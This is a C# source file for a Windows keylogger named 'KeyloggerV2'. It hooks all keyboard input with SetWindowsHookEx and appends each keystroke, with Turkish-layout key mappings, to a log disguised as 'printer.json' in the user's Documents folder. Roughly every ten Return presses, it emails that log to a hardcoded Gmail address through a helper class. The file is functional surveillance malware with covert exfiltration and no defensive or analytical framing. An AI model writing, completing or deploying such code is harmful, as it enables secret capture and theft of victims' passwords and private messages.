#region - Using

using System;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.Windows.Forms;
using System.IO;
using System.Threading;
using Helper;

#endregion - Using

namespace KeyloggerV2
{
    internal class Program
    {
        private static int WH_KEYBOARD_LL = 13;
        private static int WM_KEYDOWN = 0x0100;
        private static IntPtr hook = IntPtr.Zero;
        private static LowLevelKeyboardProc llkProcedure = HookCallback;
        private static long count = 0;

        private static void Main(string[] args)
        {
            hook = SetHook(llkProcedure);
            Application.Run();
            UnhookWindowsHookEx(hook);
        }

        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
            {
                Thread.Sleep(5);
                //Console.Out.WriteLine(lParam);
                String filePath = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);

                if (!Directory.Exists(filePath))
                {
                    Directory.CreateDirectory(filePath);
                }

                string path = (filePath + @"\printer.json");

                if (!File.Exists(path))
                {
                    using (StreamWriter sw = File.CreateText(path))
                    {
                    }
                }

                int vkCode = Marshal.ReadInt32(lParam);
                if (((Keys)vkCode).ToString() == "OemPeriod")
                {
                    Console.Out.Write(".");
                    using (StreamWriter sw = File.AppendText(path))
                    {
                        sw.Write(".");
                        sw.Close();
                    }
                }
                else if (((Keys)vkCode).ToString() == "Oemcomma")
                {
                    Console.Out.Write(",");
                    using (StreamWriter sw = File.AppendText(path))
                    {
                        sw.Write(",");
                        sw.Close();
                    }
                }
                else if (((Keys)vkCode).ToString() == "Space")
                {
                    Console.Out.Write(" ");
                    using (StreamWriter sw = File.AppendText(path))
                    {
                        sw.Write(" ");
                        sw.Close();
                    }
                }
                else if (((Keys)vkCode).ToString() == "Return")
                {
                    Console.Out.Write("\n");
                    using (StreamWriter sw = File.AppendText(path))
                    {
                        sw.Write(" Return \n");
                        sw.Close();
                    }
                    count++;
                }
                else if (((Keys)vkCode).ToString() == "OemOpenBrackets")
                {
                    Console.Out.Write("ğ");
                    using (StreamWriter sw = File.AppendText(path))
                    {
                        sw.Write("ğ");
                        sw.Close();
                    }
                }
                else if (((Keys)vkCode).ToString() == "Oem6")
                {
                    Console.Out.Write("ü");
                    using (StreamWriter sw = File.AppendText(path))
                    {
                        sw.Write("ü");
                        sw.Close();
                    }
                }
                else if (((Keys)vkCode).ToString() == "Oem7")
                {
                    Console.Out.Write("i");
                    using (StreamWriter sw = File.AppendText(path))
                    {
                        sw.Write("i");
                        sw.Close();
                    }
                }
                else if (((Keys)vkCode).ToString() == "Oem1")
                {
                    Console.Out.Write("ş");
                    using (StreamWriter sw = File.AppendText(path))
                    {
                        sw.Write("ş");
                        sw.Close();
                    }
                }
                else if (((Keys)vkCode).ToString() == "OemQuestion")
                {
                    Console.Out.Write("ö");
                    using (StreamWriter sw = File.AppendText(path))
                    {
                        sw.Write("ö");
                        sw.Close();
                    }
                }
                else if (((Keys)vkCode).ToString() == "Oem5")
                {
                    Console.Out.Write("ç");
                    using (StreamWriter sw = File.AppendText(path))
                    {
                        sw.Write("ç");
                        sw.Close();
                    }
                }
                else if (((Keys)vkCode).ToString() == "D1")
                {
                    Console.Out.Write("1");
                    using (StreamWriter sw = File.AppendText(path))
                    {
                        sw.Write("1");
                        sw.Close();
                    }
                }
                else if (((Keys)vkCode).ToString() == "D2")
                {
                    Console.Out.Write("2");
                    using (StreamWriter sw = File.AppendText(path))
                    {
                        sw.Write("2");
                        sw.Close();
                    }
                }
                else if (((Keys)vkCode).ToString() == "D3")
                {
                    Console.Out.Write("3");
                    using (StreamWriter sw = File.AppendText(path))
                    {
                        sw.Write("3");
                        sw.Close();
                    }
                }
                else if (((Keys)vkCode).ToString() == "D4")
                {
                    Console.Out.Write("4");
                    using (StreamWriter sw = File.AppendText(path))
                    {
                        sw.Write("4");
                        sw.Close();
                    }
                }
                else if (((Keys)vkCode).ToString() == "D5")
                {
                    Console.Out.Write("5");
                    using (StreamWriter sw = File.AppendText(path))
                    {
                        sw.Write("5");
                        sw.Close();
                    }
                }
                else if (((Keys)vkCode).ToString() == "D6")
                {
                    Console.Out.Write("6");
                    using (StreamWriter sw = File.AppendText(path))
                    {
                        sw.Write("6");
                        sw.Close();
                    }
                }
                else if (((Keys)vkCode).ToString() == "D7")
                {
                    Console.Out.Write("7");
                    using (StreamWriter sw = File.AppendText(path))
                    {
                        sw.Write("7");
                        sw.Close();
                    }
                }
                else if (((Keys)vkCode).ToString() == "D8")
                {
                    Console.Out.Write("8");
                    using (StreamWriter sw = File.AppendText(path))
                    {
                        sw.Write("8");
                        sw.Close();
                    }
                }
                else if (((Keys)vkCode).ToString() == "D9")
                {
                    Console.Out.Write("9");
                    using (StreamWriter sw = File.AppendText(path))
                    {
                        sw.Write("9");
                        sw.Close();
                    }
                }
                else if (((Keys)vkCode).ToString() == "D0")
                {
                    Console.Out.Write("0");
                    using (StreamWriter sw = File.AppendText(path))
                    {
                        sw.Write("0");
                        sw.Close();
                    }
                }
                else if (((Keys)vkCode).ToString() == "Oem8")
                {
                    Console.Out.Write("*");
                    using (StreamWriter sw = File.AppendText(path))
                    {
                        sw.Write("*");
                        sw.Close();
                    }
                }
                else if (((Keys)vkCode).ToString() == "OemMinus")
                {
                    Console.Out.Write("-");
                    using (StreamWriter sw = File.AppendText(path))
                    {
                        sw.Write("-");
                        sw.Close();
                    }
                }
                else
                {
                    Console.Out.Write((Keys)vkCode);
                    using (StreamWriter sw = File.AppendText(path))
                    {
                        sw.Write((Keys)vkCode);
                        sw.Close();
                    }
                }
                if (count % 10 == 0)
                {
                    MailHelper.SendNewMessage(@"\printer.json", "mrtcnrdmii@gmail.com");
                }
            }
            return CallNextHookEx(IntPtr.Zero, nCode, wParam, lParam);
        }

        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            Process currentProcess = Process.GetCurrentProcess();
            ProcessModule currentModule = currentProcess.MainModule;
            String moduleName = currentModule.ModuleName;
            IntPtr moduleHandle = GetModuleHandle(moduleName);
            return SetWindowsHookEx(WH_KEYBOARD_LL, llkProcedure, moduleHandle, 0);
        }

        [DllImport("user32.dll")]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("user32.dll")]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll")]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("kernel32.dll")]
        private static extern IntPtr GetModuleHandle(String lpModuleName);
    }
}